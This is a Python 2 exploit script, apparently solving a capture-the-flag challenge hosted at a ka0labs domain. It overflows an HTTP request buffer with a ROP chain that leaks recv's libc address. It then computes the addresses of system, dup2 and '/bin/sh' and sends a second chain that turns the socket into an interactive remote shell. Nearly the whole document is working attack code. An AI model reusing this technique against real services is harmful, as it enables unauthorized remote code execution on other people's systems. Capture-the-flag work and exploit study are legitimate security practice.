#!/usr/bin/python

import os
import sys
import time
import socket
import string
from struct import pack,unpack

host = 'nn7ed.ka0labs.org'
port = 1002 
padding = 'A'*535

p = lambda x : pack("<L", x)   # pack
u = lambda x : unpack("<L", x) # unpack

def get_connection(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	return s

def send_request(s, request_file):
	s.send("GET /" + request_file + " HTTP/1.1\r\n\r\n")

def interact_shell(s):
	while True:
		try:
			sys.stdout.write("$ ")
			sys.stdout.flush()
			c = sys.stdin.readline()
			s.send(c)
			time.sleep(0.5)
			sys.stdout.write(s.recv(4096))
		except KeyboardInterrupt, e:
			print " quit"
			s.close()
			break

send_plt = 0x080488e0  # send@plt
recv_got = 0x0804a878  # recv@got
pop4 = 0x080491cc # pop ebx ; pop esi ; pop edi ; pop ebp ;;

# size_t send(int sockfd, const void *buf, size_t len, int flags)
send = p(send_plt)     # write()
send += p(pop4)        # RET -> clean args
send += p(4)           # socket fd
send += p(recv_got)    # read@GOT
send += p(4)           # 4 bytes
send += p(0)           # flags = 0

s = get_connection(host, port)

resp = send_request(s, padding + send)
recv_libc = u(s.recv(4))[0] # recv@libc

print "[*] Leaked recv@libc: 0x%08x" % recv_libc

libc = recv_libc - 0xe8c60
system = libc + 0x3a840
dup2 = libc + 0xd73e0
bin_sh_str = libc + 0x15cd48

print "[*] Discovered libc base: 0x%.8x" % libc
print "[*] system@libc: 0x%08x" % system
print "[*] dup2@libc: 0x%08x" % dup2
print "[*] /bin/sh string at: 0x%08x" % bin_sh_str
print "[*] Sending prepared payload..."

payload =  p(dup2)
payload += p(pop4+2)
payload += p(4)
payload += p(0)

payload += p(dup2)
payload += p(pop4+2)
payload += p(4)
payload += p(1)

payload += p(system)
payload += "AAAA" # fake retn address
payload += p(bin_sh_str)

s = get_connection(host, port)
resp = send_request(s, padding + payload)

s.send("echo l33t\n")
if "l33t" in s.recv(64):
	print "[+] g0t sh3ll ;D"
	interact_shell(s)
else:
	print "[-] woopss"


